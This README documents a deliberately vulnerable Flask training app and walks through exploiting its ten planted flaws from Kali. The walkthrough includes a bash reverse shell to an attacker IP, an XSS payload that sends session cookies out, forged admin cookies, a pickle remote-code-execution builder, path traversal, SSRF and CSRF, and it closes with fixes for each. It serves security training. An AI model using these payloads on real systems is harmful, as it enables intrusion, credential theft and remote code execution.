# SecureCorp Employee Portal — Vulnerable Practice App

A deliberately broken Flask app for local VAPT practice. No database — all
"storage" is the `data.json` file next to `app.py`. **Run only in an
isolated VM / host-only network.** This is for attacking your own lab, not
anything else.

## Setup (on the target machine, e.g. an Ubuntu/Debian VM)

```bash
pip install flask
python3 app.py
```

The app listens on `0.0.0.0:5001`, so from Kali (on the same host-only
network) you can reach it at `http://<target-ip>:5001`. It needs internet
access once (to pull the Google Fonts stylesheet) but works fine without it
too — the font just falls back to a system font.

Seed logins: `admin/admin123`, `jdoe/password1`, `asmith/letmein99`.

---

## The 10 vulnerabilities and how to exploit each from Kali

### 1. Command Injection — `/tools/ping`
The "host" field is dropped straight into a shell command
(`ping -c 1 <host>` via `shell=True`).

- Log in, go to **Network Tool**, and in the host field enter:
  ```
  127.0.0.1; id; whoami
  ```
  or, with Burp Suite (intercept the POST to `/tools/ping` and edit the
  `host` parameter):
  ```
  127.0.0.1 && cat /etc/passwd
  ```
- With `curl` after logging in and saving cookies:
  ```bash
  curl -s -c cookies.txt -X POST -d "username=admin&password=admin123" \
       http://<target>:5001/login
  curl -s -b cookies.txt -X POST \
       --data-urlencode "host=127.0.0.1; id" \
       http://<target>:5001/tools/ping
  ```
- For a reverse shell: start `nc -lvnp 4444` on Kali, then submit
  `host=127.0.0.1; bash -c 'bash -i >& /dev/tcp/<kali-ip>/4444 0>&1'`.

### 2. Stored XSS — `/notes`
Note bodies are rendered with no escaping.

- Log in, go to **Notes**, and post:
  ```html
  <script>fetch('http://<kali-ip>:8000/steal?c='+document.cookie)</script>
  ```
- On Kali, run `python3 -m http.server 8000` and watch for hits as any
  other user (e.g. `admin`) opens the Notes page — their session cookie
  arrives in your access log, which you can then replay (see bug #4).

### 3. IDOR — `/profile/<id>`
Any logged-in user can view any other user's full record, including
plaintext password, by just changing the ID.

- Log in as `jdoe` (id 2), then visit:
  ```
  http://<target>:5001/profile/1
  ```
  This returns admin's plaintext password and private note — no
  ownership or role check is performed.

### 4. Broken Authentication / Forgeable Session — login + cookie
The session cookie is `base64(username)`, unsigned, with no server-side
session store. Anyone can mint a valid admin cookie without a password.

```bash
python3 -c "import base64; print(base64.b64encode(b'admin').decode())"
# -> YWRtaW4=
curl -s -b "session=YWRtaW4=" http://<target>:5001/dashboard
```
That's a full admin session, no credentials needed.

### 5. Path Traversal / LFI — `/files/<filename>`
The filename is joined onto the uploads folder with no sanitization.

```bash
curl -s -b cookies.txt "http://<target>:5001/files/../../../../etc/passwd"
```
or in a browser:
```
http://<target>:5001/files/../../../../etc/passwd
```

### 6. Insecure Deserialization — `/settings/import`
The "Import workspace backup" box runs `pickle.loads()` on whatever
base64 blob you paste in. A crafted pickle with a `__reduce__` method
runs arbitrary code on the server the moment it's deserialized.

```bash
python3 -c "
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned.txt',))
print(base64.b64encode(pickle.dumps(E())).decode())
" > payload.txt

curl -s -b cookies.txt -X POST \
     --data-urlencode "data=$(cat payload.txt)" \
     http://<target>:5001/settings/import
```
Swap `id > /tmp/pwned.txt` for a reverse shell one-liner for full RCE.

### 7. Mass Assignment / Privilege Escalation — `/profile/edit`
The edit-profile form applies every POSTed field to the logged-in
user's record with no allow-list — including `role`.

```bash
curl -s -c cookies.txt -X POST -d "username=jdoe&password=password1" \
     http://<target>:5001/login
curl -s -b cookies.txt -X POST \
     -d "email=jdoe@securecorp.local&password=password1&secret_note=x&role=admin" \
     http://<target>:5001/profile/edit
```
`jdoe` is now an admin — confirm at `/profile/2`.

### 8. Open Redirect — `/login?next=...`
The post-login redirect target is taken from `next` with no validation.

```
http://<target>:5001/login?next=https://evil-phish.example
```
After a real, successful login the browser is sent straight to the
attacker's URL — useful for phishing follow-up or stealing OAuth-style
tokens appended to a redirect chain.

### 9. SSRF (+ file:// LFI) — `/tools/webhook`
The server fetches any URL you give it, with no scheme restriction and
no block on internal addresses.

```bash
curl -s -b cookies.txt -X POST --data-urlencode "url=file:///etc/passwd" \
     http://<target>:5001/tools/webhook
curl -s -b cookies.txt -X POST \
     --data-urlencode "url=http://127.0.0.1:5001/profile/1" \
     http://<target>:5001/tools/webhook
```
The second example makes the *server* hit its own internal API on your
behalf — the classic SSRF pattern for reaching things a firewall
otherwise blocks from the outside.

### 10. CSRF — every form in the app
There are no anti-CSRF tokens anywhere. `csrf_poc.html` (included)
auto-submits a POST to `/tools/ping` using the victim's own cookies the
moment they open the page — chaining CSRF with bug #1 turns "visit a
link" into remote command execution as whoever's logged in. Edit the
`TARGET`/`ATTACKER_IP` placeholders in the file, host it anywhere
(even `file://` locally), and send the link to a logged-in victim.

---

## Suggested Kali toolchain per bug
| Vulnerability            | Tools |
|---------------------------|-------|
| Command Injection          | Burp Suite (Repeater/Intruder), `curl`, `nc` for reverse shell |
| Stored XSS                  | Burp Suite, `beef-xss` (optional), browser devtools |
| IDOR                        | Burp Suite (just edit the URL/ID), `curl` |
| Broken Auth / Session       | `curl`, Python one-liner (as above), Burp Suite cookie editing |
| Path Traversal              | Burp Suite, `curl`, `dotdotpwn` (optional) |
| Insecure Deserialization    | Python `pickle` payload builder, `curl` |
| Mass Assignment             | Burp Suite (add extra form field), `curl` |
| Open Redirect                | Browser, `curl -I` to trace `Location` headers |
| SSRF                         | `curl`, Burp Collaborator (optional) for out-of-band confirmation |
| CSRF                         | `csrf_poc.html` + any web server/`file://`, browser |

## Fixing each bug (for the write-up / report)
1. Never build shell strings from input — use `subprocess.run([...], shell=False)` with an argument list, or validate the host against a strict hostname/IP regex.
2. Escape output (Jinja2 autoescaping / `markupsafe.escape`) or use a sanitizer like `bleach` on stored user content.
3. Check `current_user()["id"] == user_id or current_user()["role"] == "admin"` before returning a profile.
4. Use `flask.session` with a real `app.secret_key` (signed, tamper-evident), hash passwords with `bcrypt`/`argon2`, add login rate-limiting.
5. Sanitize with `os.path.basename(filename)` and verify `os.path.realpath(target).startswith(os.path.realpath(UPLOAD_DIR))` before opening.
6. Never unpickle untrusted input — use `json` for data interchange, which can't execute code.
7. Allow-list editable fields explicitly (`for f in ("email","password"): ...`) and never let the client set privilege-bearing fields like `role`.
8. Validate `next` against a same-origin allow-list, or just ignore client-supplied redirect targets entirely.
9. Allow-list destination hosts/schemes, resolve and block requests to private/loopback IP ranges, and disable redirects in the fetch call.
10. Add Flask-WTF (or an equivalent) CSRF token to every state-changing form and verify it server-side.